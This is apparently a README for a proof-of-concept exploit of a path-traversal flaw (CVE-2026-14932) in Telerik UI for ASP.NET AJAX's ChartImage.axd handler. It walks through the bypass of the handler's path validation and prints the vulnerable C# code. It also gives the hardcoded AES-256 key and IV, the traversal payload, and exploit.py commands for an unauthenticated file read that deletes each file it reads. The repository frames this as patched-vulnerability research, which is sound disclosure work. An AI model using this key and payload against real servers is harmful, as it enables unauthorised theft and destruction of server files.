# RadChart File Read and Deletion via Hardcoded Key

Proof-of-concept for the file read and deletion vulnerability in `ChartImage.axd` (CVE-2026-14932) in Telerik UI for ASP.NET AJAX, fixed in 2026.2.708.

## Vulnerability

`ChartImage.axd` serves temporary chart images from disk. The `ImageName` query parameter is encrypted with a hardcoded AES-256-CBC key and IV embedded in `Telerik.Charting.dll` (`Security.cs`). These values are the same across all installations and versions.

The handler's path validation (`IsFilePathSecure`) checks that the decrypted path:

1. Starts with the application's physical root path.
2. Matches a regex for the chart filename format (`chart_<GUID>`).
3. Ends with an image extension (`.png`, `.jpg`, etc.).

None of these checks canonicalise the path. A traversal segment placed after the chart GUID prefix bypasses all three:

```
/chart_00000000-0000-0000-0000-000000000000/../../../target.png
```

This passes `StartsWith(appPath)` because the prefix is valid. It passes the GUID regex because it is unanchored. It passes the extension check because the path ends with `.png`. But after the OS resolves the `../` segments, the actual file read hits the target.

After serving the file content, the handler **deletes** it from disk. This makes every successful read a destructive operation. The client cannot prevent the deletion.

**WARNING:** every request to the handler deletes the target file after reading it. Use with extreme care in authorised testing only.

---

## Attack path

```
GET /ChartImage.axd?ImageName=<base64>&useSession=false&imageFormat=Png
    |
    v
ChartHttpHandler.ProcessRequest()
  -> garbledPath = UngarbleImagePath(Request["ImageName"])
    -> Convert.FromBase64String(ImageName)
    -> Security.decryptStringFromBytes_AES(ciphertext, chartKey, chartIV)  (hardcoded AES-256-CBC)
    -> returns "/chart_00000000-0000-0000-0000-000000000000/../../../target.png"
  -> File.Exists(Server.MapPath(garbledPath))            (resolves ../ to physical path)
    -> true
  -> applicationPath = Request.ApplicationPath            (virtual path, e.g. "/")
  -> IsFilePathSecure(garbledPath, applicationPath)
    -> garbledPath.StartsWith("/")                        PASS (starts with app path)
    -> Regex("chart_({0,1}[0-9a-fA-F]{8}-...").Match()   PASS (unanchored, matches substring)
    -> garbledPath.ToUpper().EndsWith(".PNG")              PASS
    -> returns true
  -> File.ReadAllBytes(Server.MapPath(garbledPath))       (reads the target file)
  -> Response.Write(bytes)                                (sends file content to client)
  -> File.Delete(Server.MapPath(garbledPath))             (DELETES the file)
```

The three `IsFilePathSecure` checks all operate on the raw, non-canonicalised path. The `../` segments are only resolved when `Server.MapPath()` converts the virtual path to a physical path for the `File.Exists`, `File.ReadAllBytes`, and `File.Delete` calls. By that point the security check has already passed.

---

## Path validation detail

```csharp
private bool IsFilePathSecure(string imageName, string virtualPath)
{
    // Check 1: must start with the application's virtual path
    if (!imageName.StartsWith(virtualPath)) return false;

    // Check 2: must contain a chart GUID pattern (unanchored regex)
    if (!new Regex(@"chart_(\{){0,1}[0-9a-fA-F]{8}\-([0-9a-fA-F]{4}\-){3}[0-9a-fA-F]{12}(\}){0,1}")
        .Match(imageName).Success) return false;

    // Check 3: must end with an image extension
    string[] exts = { ".BMP", ".EXIF", ".GIF", ".ICON", ".JPEG", ".PNG", ".TIFF", ".WMF" };
    foreach (string ext in exts)
        if (imageName.ToUpper().EndsWith(ext)) return true;
    return false;
}
```

The regex is unanchored, so it matches `chart_<GUID>` anywhere in the string. A path like `/chart_00000000-0000-0000-0000-000000000000/../target.png` satisfies all three checks while the `../` resolves to a completely different directory at the filesystem level.

The target file must have an image extension. To read a file like `web.config`, the adversary would first need to copy or rename it to end with `.png`. If any other vulnerability in the chain provides a file-write primitive, this limitation can be bypassed.

## Prerequisites

- `ChartImage.axd` registered in the target application (present whenever Telerik.Charting is deployed)
- The target file must end with an image extension (`.png`, `.jpg`, `.gif`, `.bmp`) or be renamed/copied to have one
- No authentication required
- Python 3.8+

## Usage

```bash
pip install -r requirements.txt

# Read a .png file (WARNING: this deletes the file on the server)
python3 exploit.py http://target:8080 \
    --file 'c:/inetpub/wwwroot/uploads/chart_cache/image.png' \
    --output retrieved.png

# Generate the encrypted ImageName without sending (safe)
python3 exploit.py http://target:8080 \
    --file 'c:/inetpub/wwwroot/test.png' \
    --encrypt-only

# Specify a non-default application path
python3 exploit.py http://target:8080 \
    --file 'c:/inetpub/wwwroot/test.png' \
    --app-path '/myapp'

# Route through Burp
python3 exploit.py http://target:8080 \
    --file 'c:/inetpub/wwwroot/test.png' \
    --output test.png \
    --proxy http://127.0.0.1:8080
```

### Flags

| Flag | Default | Purpose |
|---|---|---|
| `base` (positional) | required | Target base URL |
| `--file` | required | Absolute path of the target file on the server |
| `--app-path` | `/` | Application virtual path |
| `--handler` | `ChartImage.axd` | Chart handler path |
| `--extension` | `.png` | Required file extension |
| `--output` / `-o` | | Save response body to a local file |
| `--encrypt-only` | | Print the encrypted ImageName and exit without sending |
| `--proxy` | | HTTP proxy URL |
| `-v` | | Verbose output |

## How it works

1. Build a traversal path that starts with `<appPath>/chart_<fake-GUID>` and uses `../` segments to reach the target file.
2. Encrypt the path using the hardcoded AES-256-CBC key and IV from `Telerik.Charting.Security`.
3. Send `GET /ChartImage.axd?ImageName=<encrypted>&useSession=false&imageFormat=Png`.
4. The handler decrypts the `ImageName`, runs `IsFilePathSecure()` (which passes because of the non-canonicalised prefix), reads the file, returns its content, and then deletes the file.

### Hardcoded key material

From `Telerik.Charting.Security`:

```
Key: d0 56 59 0e 05 22 5e 28 01 6e 2d 17 c9 83 65 ef 6a 18 5b f6 6e 85 7f 11 ae 6e c8 5b ca f9 a0 8d
IV:  e8 9d 1f d8 0c 4e ea 2e d4 ec 83 34 d3 aa b2 95
```

These values are identical across all Telerik UI for ASP.NET AJAX versions that ship `Telerik.Charting.dll`.

## Expected output

```
[*] encrypted ImageName: aBcDeFgH...==

[!] WARNING: the server DELETES the file after serving it.
[!] This request will destroy c:/inetpub/wwwroot/uploads/image.png on the target.

[*] GET http://target:8080/ChartImage.axd
[*] HTTP 200 (34567 bytes, Content-Type: image/png)
[+] file content retrieved (34567 bytes)
[+] saved to retrieved.png
```

## Files

| File | Description |
|---|---|
| `exploit.py` | Encrypts a traversal path with the hardcoded key and retrieves the file via `ChartImage.axd`. |
| `requirements.txt` | Python dependencies. |
| `Dockerfile` | Python 3.12-slim container. |

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## License

Released under the [MIT License](../../LICENSE).
